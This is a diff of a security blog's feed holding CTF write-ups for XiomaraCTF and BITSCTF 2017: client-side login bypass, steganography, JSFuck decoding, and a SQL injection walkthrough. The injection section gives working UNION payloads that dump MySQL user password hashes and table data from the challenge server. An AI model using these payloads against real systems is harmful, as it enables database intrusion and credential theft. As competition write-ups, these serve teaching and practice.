+<p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"main.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"flag.css"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>= <span class="string">"center"</span>&gt;</span>Login Portal<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">""</span>&gt;</span></div><div class="line"></div><div class="line">        <span class="tag">&lt;<span class="name">b</span>&gt;</span>Username :<span class="tag">&lt;<span class="name">b</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span> =<span class="string">"username"</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line">       <span class="tag">&lt;<span class="name">b</span>&gt;</span> Password :<span class="tag">&lt;<span class="name">b</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> /&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">onclick</span>=<span class="string">"Login()"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"verify"</span> <span class="attr">name</span>=<span class="string">"button"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>Let's see <code>main.js</code>:</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Login</span>(<span class="params"></span>)</span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">var</span> username=<span class="built_in">document</span>.login.username.value;</div><div class="line">    <span class="keyword">var</span> password=<span class="built_in">document</span>.login.password.value;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">if</span> (password == <span class="string">"53cure"</span> &amp;&amp; username==<span class="string">"@nokh@"</span>) &#123;</div><div class="line">        alert(<span class="string">"Awesome!"</span>);</div><div class="line">             <span class="built_in">window</span>.open(<span class="string">"secureflag.html"</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        alert(<span class="string">"Oh swap!You are close. Why cant you try again?"</span>);</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>Now we can use <code>@nokh@</code> and <code>53cure</code> or directly go to <a href="http://139.59.61.220:23478/secureflag.html" target="_blank" rel="external">http://139.59.61.220:23478/secureflag.html</a>.</p>
+<p>The image is named <code>hiddenflag.jpeg</code> so let's download it.</p>
+<p>There is some hidden data here:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">$ binwalk hiddenflag.jpeg</div><div class="line"></div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line">0             0x0             JPEG image data, JFIF standard 1.01</div><div class="line">48981         0xBF55          Zip archive data, at least v1.0 to extract, compressed size: 29, uncompressed size: 29, name: flag.txt</div><div class="line">49154         0xC002          End of Zip archive</div><div class="line"></div><div class="line">$ foremost -v hiddenflag.jpeg</div><div class="line">Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus</div><div class="line">Audit File</div><div class="line"></div><div class="line">Foremost started at Sun Feb 26 19:14:21 2017</div><div class="line">Invocation: foremost -v hiddenflag.jpeg</div><div class="line">Output directory: /home/noraj/CTF/XiomaraCTF/2017/output</div><div class="line">Configuration file: /etc/foremost.conf</div><div class="line">Processing: hiddenflag.jpeg</div><div class="line">|------------------------------------------------------------------</div><div class="line">File: hiddenflag.jpeg</div><div class="line">Start: Sun Feb 26 19:14:21 2017</div><div class="line">Length: 48 KB (49176 bytes)</div><div class="line"></div><div class="line">Num	 Name (bs=512)	       Size	 File Offset	 Comment</div><div class="line"></div><div class="line">0:	00000000.jpg 	      47 KB 	          0 	 </div><div class="line">foundat=flag.txtUT</div><div class="line">1:	00000095.zip 	      196 B 	      48981 	 </div><div class="line">*|</div><div class="line">Finish: Sun Feb 26 19:14:21 2017</div><div class="line"></div><div class="line">2 FILES EXTRACTED</div><div class="line"></div><div class="line">jpg:= 1</div><div class="line">zip:= 1</div><div class="line">------------------------------------------------------------------</div><div class="line"></div><div class="line">Foremost finished at Sun Feb 26 19:14:21 2017</div><div class="line"></div><div class="line">$ cd output/zip</div><div class="line"></div><div class="line">$ unzip 00000095.zip</div><div class="line">Archive:  00000095.zip</div><div class="line"> extracting: flag.txt</div><div class="line"></div><div class="line">$ cat flag.txt</div><div class="line">xiomara&#123;50_y0u_ar3_@_h@ck3r&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="50-lulz-web-exploitation">50 - Lulz - Web Exploitation</h2>
+<blockquote>
+<p>Heavy sarcasm awaits. Are you a person who finds opportunities even in trolls? Well, let's find out.</p>
+<p><a href="http://139.59.61.220:23456" target="_blank" rel="external">http://139.59.61.220:23456</a></p>
+</blockquote>
+<p>The webpage is a troll opening a pop-up and redirecting to a troll page: <a href="http://139.59.61.220:23456/troll.html" target="_blank" rel="external">http://139.59.61.220:23456/troll.html</a></p>
+<p>But of course you are using NoScript or know about <code>view-source:</code> in Firefox.</p>
+<p>Let's see the source (<code>view-source:http://139.59.61.220:23456/</code>):</p>
+<p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Hahaha!!!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> =<span class="string">"lol.jpg"</span> <span class="attr">align</span> =<span class="string">"center"</span> <span class="attr">width</span> =<span class="string">"50%"</span> <span class="attr">height</span> = <span class="string">"50%"</span> <span class="attr">alt</span> =<span class="string">"lollol"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"hook.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p><code>hook.js</code> source:</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">catch_me</span>(<span class="params"></span>)</span></div><div class="line">&#123;</div><div class="line">(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]]) <span class="comment">/*VERY LONG*/</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"> <span class="function"><span class="keyword">function</span> <span class="title">Redirect</span>(<span class="params"></span>) </span>&#123;</div><div class="line">               <span class="built_in">window</span>.location=<span class="string">"troll.html"</span>;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            alert(<span class="string">"Warning you are about to be trolled"</span>);</div><div class="line">            setTimeout(<span class="string">'Redirect()'</span>, <span class="number">0</span>);</div></pre></td></tr></table></figure></p>
+<p>The <code>catch_me()</code> function looks like some brainfuck-js.</p>
+<p>Copy it and paste it in your browser terminal, you will get:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;alert(Xiomara&#123;i_4gr33_Y0U_4r3_a_Flash!&#125;))&quot;</div></pre></td></tr></table></figure></p>
+<p>The is a <s>mistake</s> troll, so correct <code>Xiomara{i_4gr33_Y0U_4r3_a_Flash!}</code> into <code>xiomara{i_4gr33_Y0U_4r3_a_Flash!}</code> (lowercase the first char).</p>
+<h2 id="50-no-flags-web-exploitation">50 - No Flags? - Web Exploitation</h2>
+<blockquote>
+<p>What would you do if we tell you there are no flags for this question? Go on, solve it. That reminds me, Nothing is impossible.</p>
+<p><a href="http://139.59.61.220:23467/" target="_blank" rel="external">http://139.59.61.220:23467/</a></p>
+</blockquote>
+<p>I tried <a href="http://139.59.61.220:23467/robots.txt" target="_blank" rel="external"><code>robots.txt</code></a>:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">User-agent:*</div><div class="line">Disallow: /flags/</div><div class="line">Disallow: /more_flags/</div><div class="line">Disallow: /more_and_more_flags/</div><div class="line">Disallow: /no_flag/</div></pre></td></tr></table></figure></p>
+<p><code>/flags/</code>, <code>/more_flags/</code> and <code>/more_and_more_flags/</code> are obviously trolls.</p>
+<p>Let's see <code>/no_flag/</code> source:</p>
+<p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">function encode(str) &#123;</div><div class="line">str = str.replace(/http:/g, "^^^");</div><div class="line">str = str.replace(/bin/g, "*^$#!")</div><div class="line">str= str.replace(/com/g, "*%=_()");</div><div class="line">str= str.replace(/paste/g, "~~@;;");</div><div class="line">&#125;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;iframe src="flag.txt" width="2500" height="2255"&gt;</div><div class="line">&lt;/iframe&gt;</div></pre></td></tr></table></figure></p>
+<p>It's an iframe of <code>flag.txt</code> which containd some ASCII art, like the three others. But this time there is a script.</p>
+<p>The ASCII art display <em>YOU HAVE BEEN HACKED !</em> but on the middle of <em>HACKED</em> we can see <code>&quot;^^^//~~@;;*^$#!.*%=_()/SwzEKazp&quot;</code>.</p>
+<p>So let's replace back: <code>http://pastebin.com/SwzEKazp</code>.</p>
+<p>So go to pastebin and... <code>This page has been removed!</code>.</p>
+<p>So go to the <a href="https://web.archive.org/web/20170225133747/http://pastebin.com/SwzEKazp" target="_blank" rel="external">wayback machine</a>, there is a snapshot dating from 25 Feb. 2017.</p>
+<p>We can see an untitled document from <em>XIOMARA_CTF</em> containing: <code>eGlvbWFyYXsxXzRtX21yX3IwYjA3fQ==</code>.</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ printf %s &apos;eGlvbWFyYXsxXzRtX21yX3IwYjA3fQ==&apos; | base64 -di</div><div class="line">xiomara&#123;1_4m_mr_r0b07&#125;</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
+&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;By&lt;/th&gt;
+&lt;th&gt;Version&lt;/th&gt;
+&lt;th&gt;Comment&lt;/th&gt;
+&lt;/t
+    
+    </summary>
+    
+      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
+    
+      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
+    
+    
+      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
+    
+      <category term="web" scheme="https://rawsec.ml/tags/web/"/>
+    
+      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
     
   </entry>
   
@@ -2261,236 +2530,6 @@ Download file here:</p>
       <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
     
       <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BITSCTF 2017 - Write-ups</title>
-    <link href="https://rawsec.ml/en/BITSCTF-2017-writeups/"/>
-    <id>https://rawsec.ml/en/BITSCTF-2017-writeups/</id>
-    <published>2017-02-04T23:00:00.000Z</published>
-    <updated>2017-02-07T18:23:36.812Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
-<h3 id="version">Version</h3>
-<table>
-<thead>
-<tr>
-<th>By</th>
-<th>Version</th>
-<th>Comment</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>noraj</td>
-<td>1.0</td>
-<td>Creation</td>
-</tr>
-</tbody>
-</table>
-<h3 id="ctf">CTF</h3>
-<ul>
-<li><strong>Name</strong> : BITSCTF 2017</li>
-<li><strong>Website</strong> : <a href="https://bitsctf.bits-quark.org/" target="_blank" rel="external">bitsctf.bits-quark.org</a></li>
-<li><strong>Type</strong> : Online</li>
-<li><strong>Format</strong> : Jeopardy</li>
-<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/417" target="_blank" rel="external">link</a></li>
-</ul>
-<h2 id="10-botbot-web">10 - BotBot - web</h2>
-<blockquote>
-<p>Should not ask for the description of a 5 marker.</p>
-<p><a href="http://botbot.bitsctf.bits-quark.org" target="_blank" rel="external">botbot.bitsctf.bits-quark.org</a></p>
-</blockquote>
-<p>Let's look at the source code:</p>
-<p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE HTML&gt;</span></div><div class="line"><span class="comment">&lt;!--</span></div><div class="line">	Nothing to see here. Maybe try looking up seo .txt</div><div class="line">--&gt;</div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"></div><div class="line">[...]</div></pre></td></tr></table></figure></p>
-<p>Now go to <code>http://botbot.bitsctf.bits-quark.org/robots.txt</code>:</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Useragent *</div><div class="line">Disallow: /fl4g</div></pre></td></tr></table></figure></p>
-<p><a href="http://botbot.bitsctf.bits-quark.org/fl4g/" target="_blank" rel="external">http://botbot.bitsctf.bits-quark.org/fl4g/</a> :</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">BITCTF&#123;take_a_look_at_googles_robots_txt&#125;</div></pre></td></tr></table></figure></p>
-<h2 id="20-labour-misc">20 - Labour - Misc</h2>
-<blockquote>
-<p>Follow your heart, for it leads you straight to the answer.</p>
-</blockquote>
-<p>It's a gpx file:</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot; ?&gt;</div><div class="line">&lt;gpx version=&quot;1.1&quot; creator=&quot;BITSCTF&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://www.topografix.com/GPX/1/1&quot; xsi:schemaLocation=&quot;http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd&quot;&gt;</div><div class="line"></div><div class="line">&lt;!--Use appropriate brackets and underscores to separate words if you succeed--&gt;</div><div class="line">&lt;wpt lat=&quot;23.71697&quot; lon=&quot;89.45508&quot;&gt;</div><div class="line">&lt;ele&gt;12.1&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP01-A&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;22.82885&quot; lon=&quot;80.79786&quot;&gt;</div><div class="line">&lt;name&gt;WP02-B&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;39.88276&quot; lon=&quot;58.81642&quot;&gt;</div><div class="line">&lt;name&gt;WP03-C&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;15.43674&quot; lon=&quot;27.65039&quot;&gt;</div><div class="line">&lt;name&gt;WP04-D&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;12.69179&quot; lon=&quot;17.50781&quot;&gt;</div><div class="line">&lt;ele&gt;288.7&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP05-E&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;14.91081&quot; lon=&quot;100.47656&quot;&gt;</div><div class="line">&lt;ele&gt;13.1&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP06-F&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;45.9267&quot; lon=&quot;2.21484&quot;&gt;</div><div class="line">&lt;ele&gt;557.9&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP07-G&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;4.11852&quot; lon=&quot;102.19922&quot;&gt;</div><div class="line">&lt;ele&gt;67.2&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP08-H&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;34.85709&quot; lon=&quot;65.84765&quot;&gt;</div><div class="line">&lt;ele&gt;3209.7&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP09-I&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;28.89086&quot; lon=&quot;68.30859&quot;&gt;</div><div class="line">&lt;ele&gt;116.9&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP10-J&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;39.20502&quot; lon=&quot;31.92187&quot;&gt;</div><div class="line">&lt;ele&gt;797.8&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP11-K&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;47.24344&quot; lon=&quot;19.8457&quot;&gt;</div><div class="line">&lt;ele&gt;93.5&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP12-L&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;25.30828&quot; lon=&quot;29.84765&quot;&gt;</div><div class="line">&lt;ele&gt;267&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP13-M&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;18.97119&quot; lon=&quot;-72.28521&quot;&gt;</div><div class="line">&lt;ele&gt;375&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP14-N&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;-13.61609&quot; lon=&quot;17.68359&quot;&gt;</div><div class="line">&lt;ele&gt;1510.9&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP15-O&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;33.84122&quot; lon=&quot;102.23438&quot;&gt;</div><div class="line">&lt;ele&gt;3426.2&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP16-P&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;46.89624&quot; lon=&quot;69.53907&quot;&gt;</div><div class="line">&lt;ele&gt;364.4&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP17-Q&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;/gpx&gt;</div></pre></td></tr></table></figure></p>
-<p>We can open it online with:</p>
-<ul>
-<li><a href="http://www.visugpx.com/index.php" target="_blank" rel="external">http://www.visugpx.com/index.php</a></li>
-<li><a href="http://www.gpsvisualizer.com/map?output_home" target="_blank" rel="external">http://www.gpsvisualizer.com/map?output_home</a></li>
-</ul>
-<p>Take the waypoint in order and write the name of the country:</p>
-<ol>
-<li>WP01-A - Bangladesh</li>
-<li>WP02-B - India</li>
-<li>WP03-C - Turkmenistan</li>
-<li>WP04-D - Sudan</li>
-<li>WP05-E - Chad</li>
-<li>WP06-F - Thailand</li>
-<li>WP07-G - France</li>
-<li>WP08-H - Malesia</li>
-<li>WP09-I - Afganistan</li>
-<li>WP10-J - Pakistan</li>
-<li>WP11-K - Turkey</li>
-<li>WP12-L - Hungary</li>
-<li>WP13-M - Egypt</li>
-<li>WP14-N - Haiti</li>
-<li>WP15-O - Angola</li>
-<li>WP16-P - China</li>
-<li>WP17-Q - Kazaksztan</li>
-</ol>
-<p>Taking the first letter of each country in order give me <strong>BITSCTFMAPTHEHACK</strong> and the comment said:</p>
-<blockquote>
-<p>Use appropriate brackets and underscores to separate words if you succeed</p>
-</blockquote>
-<p>So I get <strong>BITSCTF{MAP_THE_HACK}</strong></p>
-<h1 id="30-batman-vs-joker-web">30 - Batman vs Joker - Web</h1>
-<blockquote>
-<p>Joker has left a message for you. Your job is to get to the message asap.</p>
-<p><a href="http://joking.bitsctf.bits-quark.org" target="_blank" rel="external">joking.bitsctf.bits-quark.org</a></p>
-</blockquote>
-<p>Try a quick <code>' or 1=1 #'</code>: this is working so we have a vulnerable MySQL database.</p>
-<p>Let's enjoy SQLi.</p>
-<p>Just curious to know the DB version: <code>' or 1=1 UNION SELECT @@version,1 #</code>: <strong>5.5.54-0+deb8u1</strong></p>
-<p>Current databse name: <code>' or 1=1 UNION SELECT database(),1 #</code>: <strong>hack</strong></p>
-<p>Just curious to list the databse users: <code>' or 1=1 UNION SELECT host, user FROM mysql.user #</code> and <code>' or 1=1 UNION SELECT user, password FROM mysql.user #</code>:</p>
-<table>
-<thead>
-<tr>
-<th>host</th>
-<th>user</th>
-<th>password</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>%</td>
-<td>tester</td>
-<td>*975B2CD4FF9AE554FE8AD33168FBFC326D2021DD</td>
-</tr>
-<tr>
-<td>127.0.0.1, 33842653d6db, ::1, localhost</td>
-<td>root</td>
-<td>*A2AE2E3109CE064A1AED30C0E71E021540F30700</td>
-</tr>
-<tr>
-<td>localhost</td>
-<td>debian-sys-maint</td>
-<td>*A9A6626F5FEE26E9EDDE42FF9274124A98F82A3F</td>
-</tr>
-</tbody>
-</table>
-<p>I want to know the name of tables in the hack databse: <code>' or 1=1 UNION SELECT table_schema, table_name FROM information_schema.columns WHERE table_schema = 'hack' #</code>:</p>
-<table>
-<thead>
-<tr>
-<th>table_schema</th>
-<th>table_name</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>hack</td>
-<td>CIA_Official_Records</td>
-</tr>
-<tr>
-<td>hack</td>
-<td>joker</td>
-</tr>
-</tbody>
-</table>
-<p>And finally I want to know the name of columns in the both previous tables: <code>' or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'CIA_Official_Records' or table_name = 'joker' #</code>:</p>
-<table>
-<thead>
-<tr>
-<th>table_name</th>
-<th>column_name</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>CIA_Official_Records</td>
-<td>id</td>
-</tr>
-<tr>
-<td>CIA_Official_Records</td>
-<td>username</td>
-</tr>
-<tr>
-<td>CIA_Official_Records</td>
-<td>first_name</td>
-</tr>
-<tr>
-<td>CIA_Official_Records</td>
-<td>last_name</td>
-</tr>
-<tr>
-<td>Joker</td>
-<td>Flag</td>
-</tr>
-<tr>
-<td>Joker</td>
-<td>HaHaHa</td>
-</tr>
-</tbody>
-</table>
-<p>Pretty easy to know where to find teh flag now: <code>' or 1=1 UNION SELECT Flag, HaHaHa FROM Joker #</code>:</p>
-<table>
-<thead>
-<tr>
-<th>Flag</th>
-<th>HaHaHa</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>BITSCTF{wh4t_d03snt_k1ll_y0u_s1mply_m4k3s_y0u_str4ng3r!}</td>
-<td>Enjoying the game Batman!!!</td>
-</tr>
-</tbody>
-</table>
-<h2 id="50-tom-and-jerry-forensics">50 - Tom and Jerry - Forensics</h2>
-<p><strong>WARNING</strong>: we didn't solve this challenge, so write-up is incomplete.</p>
-<p>Open the pcapng with Wireshark.</p>
-<p>Device Descriptor tell us:</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">idVendor: Wacom Co., Ltd (0x056a)</div><div class="line">idProduct: CTL-460 [Bamboo Pen (S)] (0x00d4)</div></pre></td></tr></table></figure></p>
-<p>So this is a Pen Tablet.</p>
-<p>We can use a filter <code>usb.transfer_type == 0x01</code> to oly see frame where there is data.</p>
-<p>We can complete the filter with <code>(frame.len == 73)</code> to see only one side of the exchange and <code>!(usb.capdata == 00:00:00:00:00:00:00:00)</code> to hide null data. Finally that give us this filter: <code>((usb.transfer_type == 0x01) &amp;&amp; (frame.len == 73)) &amp;&amp; !(usb.capdata == 00:00:00:00:00:00:00:00)</code>.</p>
-<p>USB transfert type is <em>USB INTERRUPT</em>: <a href="http://www.beyondlogic.org/usbnutshell/usb4.shtml#Interrupt" target="_blank" rel="external">http://www.beyondlogic.org/usbnutshell/usb4.shtml#Interrupt</a></p>
